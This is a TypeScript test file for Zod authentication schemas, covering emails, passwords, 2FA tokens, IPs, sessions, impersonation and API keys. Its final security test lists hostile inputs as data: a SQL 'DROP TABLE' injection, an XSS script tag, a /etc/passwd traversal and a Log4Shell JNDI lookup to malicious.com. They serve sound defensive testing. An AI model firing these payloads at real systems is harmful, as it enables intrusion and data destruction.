import {
  emailSchema,
  passwordSchema,
  strongPasswordSchema,
  tokenSchema,
  twoFactorTokenSchema,
  ipAddressSchema,
  loginSchema,
  refreshTokenSchema,
  logoutSchema,
  changePasswordSchema,
  resetPasswordRequestSchema,
  resetPasswordConfirmSchema,
  verifyEmailSchema,
  resendVerificationSchema,
  setupTwoFactorSchema,
  verifyTwoFactorSchema,
  disableTwoFactorSchema,
  updateProfileSchema,
  deviceInfoSchema,
  revokeSessionSchema,
  revokeAllSessionsSchema,
  impersonateUserSchema,
  createApiKeySchema,
  revokeApiKeySchema
} from '../../src/validators/auth.schemas';
import { ZodError } from 'zod';

describe('Auth Schemas Validation', () => {
  describe('emailSchema', () => {
    it('should validate valid emails', () => {
      const validEmails = [
        'user@example.com',
        'test.email+tag@domain.co.uk',
        'admin@company.org',
        'user123@test-site.com'
      ];

      validEmails.forEach(email => {
        expect(() => emailSchema.parse(email)).not.toThrow();
        expect(emailSchema.parse(email)).toBe(email.toLowerCase());
      });
    });

    it('should normalize email to lowercase and trim', () => {
      expect(emailSchema.parse('USER@EXAMPLE.COM')).toBe('user@example.com');
      expect(emailSchema.parse('Test@Domain.Com')).toBe('test@domain.com');
    });

    it('should reject invalid emails', () => {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user..user@domain.com',
        'user@domain',
        '',
        'a@b',
        'user@domain..com'
      ];

      invalidEmails.forEach(email => {
        expect(() => emailSchema.parse(email)).toThrow(ZodError);
      });
    });

    it('should enforce length constraints', () => {
      // Too short
      expect(() => emailSchema.parse('a@b')).toThrow('Email must be at least 5 characters');

      // Too long
      const longEmail = 'a'.repeat(250) + '@test.com';
      expect(() => emailSchema.parse(longEmail)).toThrow('Email must not exceed 255 characters');

      // Valid length
      expect(() => emailSchema.parse('user@domain.com')).not.toThrow();
    });
  });

  describe('passwordSchema', () => {
    it('should validate strong passwords', () => {
      const validPasswords = [
        'Password123!',
        'MySecure@Pass1',
        'Complex$Password9',
        'Test123@Password'
      ];

      validPasswords.forEach(password => {
        expect(() => passwordSchema.parse(password)).not.toThrow();
      });
    });

    it('should reject weak passwords', () => {
      const invalidPasswords = [
        'password', // No uppercase, number, special char
        'PASSWORD', // No lowercase, number, special char
        '12345678', // No letters, special char
        'Password', // No number, special char
        'Password123', // No special char
        'Short1!', // Too short (7 chars)
        '', // Empty
        'Pass12!', // Too short (7 chars)
      ];

      invalidPasswords.forEach(password => {
        expect(() => passwordSchema.parse(password)).toThrow(ZodError);
      });
    });

    it('should enforce length constraints', () => {
      expect(() => passwordSchema.parse('Short1!')).toThrow('Password must be at least 8 characters');
      expect(() => passwordSchema.parse('a'.repeat(129) + 'A1!')).toThrow('Password must not exceed 128 characters');
    });
  });

  describe('strongPasswordSchema', () => {
    it('should validate extra strong passwords', () => {
      const validPasswords = [
        'VeryStrong@Password123',
        'ExtraSecure$Pass456',
        'Complex&Password789!'
      ];

      validPasswords.forEach(password => {
        expect(() => strongPasswordSchema.parse(password)).not.toThrow();
      });
    });

    it('should reject passwords shorter than 12 characters', () => {
      expect(() => strongPasswordSchema.parse('Short123!')).toThrow('Password must be at least 12 characters for enhanced security');
    });
  });

  describe('tokenSchema', () => {
    it('should validate tokens', () => {
      const validTokens = [
        'abcdef1234',
        'jwt.token.here',
        'very-long-token-string-with-many-characters'
      ];

      validTokens.forEach(token => {
        expect(() => tokenSchema.parse(token)).not.toThrow();
      });
    });

    it('should enforce length constraints', () => {
      expect(() => tokenSchema.parse('short')).toThrow('Token must be at least 10 characters');
      expect(() => tokenSchema.parse('a'.repeat(1001))).toThrow('Token must not exceed 1000 characters');
    });
  });

  describe('twoFactorTokenSchema', () => {
    it('should validate 6-digit tokens', () => {
      const validTokens = ['123456', '000000', '999999', '012345'];

      validTokens.forEach(token => {
        expect(() => twoFactorTokenSchema.parse(token)).not.toThrow();
        expect(twoFactorTokenSchema.parse(token)).toBe(token);
      });
    });

    it('should trim whitespace', () => {
      expect(twoFactorTokenSchema.parse(' 123456 ')).toBe('123456');
    });

    it('should reject invalid tokens', () => {
      const invalidTokens = [
        '12345', // Too short
        '1234567', // Too long
        'abcdef', // Not digits
        '12345a', // Mixed
        '', // Empty
        '12 34 56' // Contains spaces
      ];

      invalidTokens.forEach(token => {
        expect(() => twoFactorTokenSchema.parse(token)).toThrow(ZodError);
      });
    });
  });

  describe('ipAddressSchema', () => {
    it('should validate IPv4 addresses', () => {
      const validIPs = [
        '192.168.1.1',
        '10.0.0.1',
        '255.255.255.255',
        '0.0.0.0',
        '127.0.0.1'
      ];

      validIPs.forEach(ip => {
        expect(() => ipAddressSchema.parse(ip)).not.toThrow();
      });
    });

    it('should validate IPv6 addresses', () => {
      const validIPs = [
        '2001:0db8:85a3:0000:0000:8a2e:0370:7334'
      ];

      validIPs.forEach(ip => {
        expect(() => ipAddressSchema.parse(ip)).not.toThrow();
      });
    });

    it('should reject invalid IP addresses', () => {
      const invalidIPs = [
        '256.256.256.256',
        '192.168.1',
        '192.168.1.1.1',
        'invalid-ip',
        '',
        '192.168.-1.1'
      ];

      invalidIPs.forEach(ip => {
        expect(() => ipAddressSchema.parse(ip)).toThrow(ZodError);
      });
    });
  });

  describe('loginSchema', () => {
    it('should validate login requests', () => {
      const validLogin = {
        email: 'user@example.com',
        password: 'any-password',
        rememberMe: true,
        twoFactorToken: '123456'
      };

      expect(() => loginSchema.parse(validLogin)).not.toThrow();
    });

    it('should set default rememberMe to false', () => {
      const login = {
        email: 'user@example.com',
        password: 'password'
      };

      const result = loginSchema.parse(login);
      expect(result.rememberMe).toBe(false);
    });

    it('should allow optional twoFactorToken', () => {
      const login = {
        email: 'user@example.com',
        password: 'password'
      };

      expect(() => loginSchema.parse(login)).not.toThrow();
    });

    it('should reject invalid login data', () => {
      const invalidLogins = [
        { email: 'invalid', password: 'test' },
        { email: 'user@test.com' }, // Missing password
        { password: 'test' }, // Missing email
        {}
      ];

      invalidLogins.forEach(login => {
        expect(() => loginSchema.parse(login)).toThrow(ZodError);
      });
    });
  });

  describe('changePasswordSchema', () => {
    it('should validate password change with matching confirmation', () => {
      const validChange = {
        currentPassword: 'oldPassword',
        newPassword: 'NewPassword123!',
        confirmPassword: 'NewPassword123!'
      };

      expect(() => changePasswordSchema.parse(validChange)).not.toThrow();
    });

    it('should reject when new password confirmation does not match', () => {
      const invalidChange = {
        currentPassword: 'oldPassword',
        newPassword: 'NewPassword123!',
        confirmPassword: 'DifferentPassword123!'
      };

      expect(() => changePasswordSchema.parse(invalidChange)).toThrow('New password confirmation does not match');
    });

    it('should reject when new password is same as current password', () => {
      const invalidChange = {
        currentPassword: 'SamePassword123!',
        newPassword: 'SamePassword123!',
        confirmPassword: 'SamePassword123!'
      };

      expect(() => changePasswordSchema.parse(invalidChange)).toThrow('New password must be different from current password');
    });
  });

  describe('resetPasswordConfirmSchema', () => {
    it('should validate password reset with matching confirmation', () => {
      const validReset = {
        token: 'valid-reset-token',
        newPassword: 'NewPassword123!',
        confirmPassword: 'NewPassword123!'
      };

      expect(() => resetPasswordConfirmSchema.parse(validReset)).not.toThrow();
    });

    it('should reject when password confirmation does not match', () => {
      const invalidReset = {
        token: 'valid-reset-token',
        newPassword: 'NewPassword123!',
        confirmPassword: 'DifferentPassword123!'
      };

      expect(() => resetPasswordConfirmSchema.parse(invalidReset)).toThrow('Password confirmation does not match');
    });
  });

  describe('verifyTwoFactorSchema', () => {
    it('should validate with token', () => {
      const validData = {
        token: '123456'
      };

      expect(() => verifyTwoFactorSchema.parse(validData)).not.toThrow();
    });

    it('should validate with backup code', () => {
      const validData = {
        backupCode: 'backup-code-123'
      };

      expect(() => verifyTwoFactorSchema.parse(validData)).not.toThrow();
    });

    it('should reject when neither token nor backup code provided', () => {
      const invalidData = {
        token: undefined,
        backupCode: undefined
      };

      expect(() => verifyTwoFactorSchema.parse(invalidData)).toThrow('Either token or backup code is required');
    });
  });

  describe('updateProfileSchema', () => {
    it('should validate profile update', () => {
      const validProfile = {
        firstName: 'John',
        lastName: 'Doe',
        phone: '+1234567890',
        timezone: 'America/New_York',
        language: 'en' as const,
        notifications: {
          email: true,
          sms: false,
          push: true,
          marketing: false
        }
      };

      expect(() => updateProfileSchema.parse(validProfile)).not.toThrow();
    });

    it('should trim and validate names', () => {
      const profile = {
        firstName: '  John  ',
        lastName: '  Doe-Smith  '
      };

      const result = updateProfileSchema.parse(profile);
      expect(result.firstName).toBe('John');
      expect(result.lastName).toBe('Doe-Smith');
    });

    it('should reject invalid names', () => {
      const invalidProfiles = [
        { firstName: 'John123', lastName: 'Doe' }, // Numbers not allowed
        { firstName: 'John@', lastName: 'Doe' }, // Special chars not allowed
        { firstName: '', lastName: 'Doe' }, // Empty first name
        { firstName: 'John', lastName: '' } // Empty last name
      ];

      invalidProfiles.forEach(profile => {
        expect(() => updateProfileSchema.parse(profile)).toThrow(ZodError);
      });
    });

    it('should validate phone numbers', () => {
      const validPhones = ['+1234567890', '1234567890', '+44123456789', ''];
      const invalidPhones = ['abc123', '++123', 'phone'];

      validPhones.forEach(phone => {
        const profile = { firstName: 'John', lastName: 'Doe', phone };
        expect(() => updateProfileSchema.parse(profile)).not.toThrow();
      });

      invalidPhones.forEach(phone => {
        const profile = { firstName: 'John', lastName: 'Doe', phone };
        expect(() => updateProfileSchema.parse(profile)).toThrow(ZodError);
      });
    });

    it('should validate language enum', () => {
      const validLanguages = ['en', 'fr', 'es', 'de'];
      const invalidLanguages = ['jp', 'invalid', ''];

      validLanguages.forEach(language => {
        const profile = { firstName: 'John', lastName: 'Doe', language };
        expect(() => updateProfileSchema.parse(profile)).not.toThrow();
      });

      invalidLanguages.forEach(language => {
        const profile = { firstName: 'John', lastName: 'Doe', language };
        expect(() => updateProfileSchema.parse(profile)).toThrow(ZodError);
      });
    });
  });

  describe('deviceInfoSchema', () => {
    it('should validate device information', () => {
      const validDevice = {
        deviceName: 'My iPhone',
        deviceType: 'mobile' as const,
        browser: 'Safari',
        os: 'iOS 15'
      };

      expect(() => deviceInfoSchema.parse(validDevice)).not.toThrow();
    });

    it('should allow all optional fields', () => {
      expect(() => deviceInfoSchema.parse({})).not.toThrow();
    });

    it('should validate device type enum', () => {
      const validTypes = ['desktop', 'mobile', 'tablet', 'other'];
      const invalidTypes = ['laptop', 'invalid', 'smartphone'];

      validTypes.forEach(deviceType => {
        const device = { deviceType };
        expect(() => deviceInfoSchema.parse(device)).not.toThrow();
      });

      invalidTypes.forEach(deviceType => {
        const device = { deviceType };
        expect(() => deviceInfoSchema.parse(device)).toThrow(ZodError);
      });
    });
  });

  describe('revokeSessionSchema', () => {
    it('should validate UUID session IDs', () => {
      const validUUIDs = [
        '123e4567-e89b-12d3-a456-426614174000',
        '550e8400-e29b-41d4-a716-446655440000'
      ];

      validUUIDs.forEach(sessionId => {
        expect(() => revokeSessionSchema.parse({ sessionId })).not.toThrow();
      });
    });

    it('should reject invalid session IDs', () => {
      const invalidUUIDs = [
        'invalid-uuid',
        '123456789',
        '',
        '123e4567-e89b-12d3-a456' // Incomplete UUID
      ];

      invalidUUIDs.forEach(sessionId => {
        expect(() => revokeSessionSchema.parse({ sessionId })).toThrow('Invalid session ID format');
      });
    });
  });

  describe('impersonateUserSchema', () => {
    it('should validate impersonation request', () => {
      const validRequest = {
        targetUserId: '123e4567-e89b-12d3-a456-426614174000',
        reason: 'Customer support assistance for billing issue resolution'
      };

      expect(() => impersonateUserSchema.parse(validRequest)).not.toThrow();
    });

    it('should reject short reasons', () => {
      const invalidRequest = {
        targetUserId: '123e4567-e89b-12d3-a456-426614174000',
        reason: 'Too short'
      };

      expect(() => impersonateUserSchema.parse(invalidRequest)).toThrow('Reason must be at least 10 characters');
    });

    it('should reject long reasons', () => {
      const invalidRequest = {
        targetUserId: '123e4567-e89b-12d3-a456-426614174000',
        reason: 'a'.repeat(501)
      };

      expect(() => impersonateUserSchema.parse(invalidRequest)).toThrow('Reason must not exceed 500 characters');
    });
  });

  describe('createApiKeySchema', () => {
    it('should validate API key creation', () => {
      const validRequest = {
        name: 'Production API Key',
        description: 'Key for production environment access',
        permissions: ['read', 'write', 'delete'],
        expiresAt: '2024-12-31T23:59:59Z',
        ipRestrictions: ['192.168.1.1', '10.0.0.1']
      };

      expect(() => createApiKeySchema.parse(validRequest)).not.toThrow();
    });

    it('should require at least one permission', () => {
      const invalidRequest = {
        name: 'Test Key',
        permissions: []
      };

      expect(() => createApiKeySchema.parse(invalidRequest)).toThrow('At least one permission is required');
    });

    it('should limit IP restrictions', () => {
      const invalidRequest = {
        name: 'Test Key',
        permissions: ['read'],
        ipRestrictions: Array(11).fill('192.168.1.1')
      };

      expect(() => createApiKeySchema.parse(invalidRequest)).toThrow('Maximum 10 IP restrictions allowed');
    });

    it('should validate IP restrictions format', () => {
      const invalidRequest = {
        name: 'Test Key',
        permissions: ['read'],
        ipRestrictions: ['invalid-ip']
      };

      expect(() => createApiKeySchema.parse(invalidRequest)).toThrow('Invalid IP address format');
    });
  });

  describe('revokeApiKeySchema', () => {
    it('should validate UUID key IDs', () => {
      const validRequest = {
        keyId: '123e4567-e89b-12d3-a456-426614174000'
      };

      expect(() => revokeApiKeySchema.parse(validRequest)).not.toThrow();
    });

    it('should reject invalid key IDs', () => {
      const invalidRequest = {
        keyId: 'invalid-key-id'
      };

      expect(() => revokeApiKeySchema.parse(invalidRequest)).toThrow('Invalid API key ID format');
    });
  });

  describe('edge cases and security', () => {
    it('should handle null and undefined values', () => {
      expect(() => emailSchema.parse(null)).toThrow();
      expect(() => emailSchema.parse(undefined)).toThrow();
      expect(() => passwordSchema.parse(null)).toThrow();
      expect(() => passwordSchema.parse(undefined)).toThrow();
    });

    it('should handle type coercion safely', () => {
      expect(() => emailSchema.parse(123)).toThrow();
      expect(() => passwordSchema.parse(true)).toThrow();
      expect(() => twoFactorTokenSchema.parse(123456)).toThrow(); // Should be string
    });

    it('should prevent injection attacks in validation', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '${jndi:ldap://malicious.com/a}'
      ];

      // These should fail validation, not cause security issues
      maliciousInputs.forEach(input => {
        expect(() => emailSchema.parse(input)).toThrow();
        expect(() => passwordSchema.parse(input)).toThrow(); // Will fail due to format requirements
      });
    });
  });
});